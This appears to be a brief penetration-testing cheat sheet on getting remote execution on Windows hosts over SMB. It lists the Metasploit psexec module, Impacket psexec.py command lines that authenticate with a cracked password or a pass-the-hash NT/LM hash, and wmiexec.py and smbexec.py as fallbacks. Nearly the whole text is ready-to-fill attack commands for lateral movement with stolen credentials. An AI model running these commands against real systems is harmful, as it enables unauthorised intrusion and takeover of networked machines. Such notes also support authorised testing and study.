## Metasploit

### use exploit/windows/smb/psexec

change payload to x64 if necessary  
you can use a cracked password or hash (nt:lm)
 
### psexec.py <domain.local>/<user>:'<password>'@<ip>

### psexec.py <user>@<ip> -hashes <password_hash>
 
can use wmiexec.py or smbexec.py if psexec.py isnt working